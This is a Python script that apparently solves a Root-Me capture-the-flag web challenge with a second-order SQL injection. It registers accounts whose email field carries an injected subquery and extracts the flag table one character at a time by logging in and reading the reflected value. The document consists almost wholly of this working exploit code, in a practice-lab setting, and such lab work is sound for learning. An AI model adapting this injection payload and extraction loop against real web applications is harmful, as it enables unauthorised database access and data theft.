import requests
from urllib.parse import quote

output = []

#query : SELECT ASCII(REPLACE((SELECT GROUP_CONCAT(flag) FROM flag
#check length of output : change ASCII() to LENGTH() --> flag has length of 30

def main():
    register_url = "http://challenge01.root-me.org/web-serveur/ch33/?action=register"
    login_url = "http://challenge01.root-me.org/web-serveur/ch33/?action=login"

    email = "'+(SELECT ASCII(REPLACE((SELECT GROUP_CONCAT(flag) FROM flag),'','')))+'"
    for i in range(30):
        register_data = {"username": f"fckboixxXx{i}", "password" : "abc", "email" : email}
        resp = requests.post(url=register_url, data=register_data)
        if "You can logged in ! " in resp.text:
            login_data = {"username": f"fckboixxXx{i}", "password" : "abc"}
            resp = requests.post(url=login_url, data=login_data)
            info = resp.text[resp.text.find("Email") + len("Email : "):-23]
            print(info)
            output.append(info)
            email = "'+(SELECT ASCII(REPLACE((SELECT GROUP_CONCAT(flag) FROM flag),'" + ''.join(chr(int(c)) for c in output) + "','')))+'"
            print(email)          
        else:
            print("Failed to register !!!")
            break
    print(''.join(chr(int(c)) for c in output))

if __name__ == "__main__":
    main()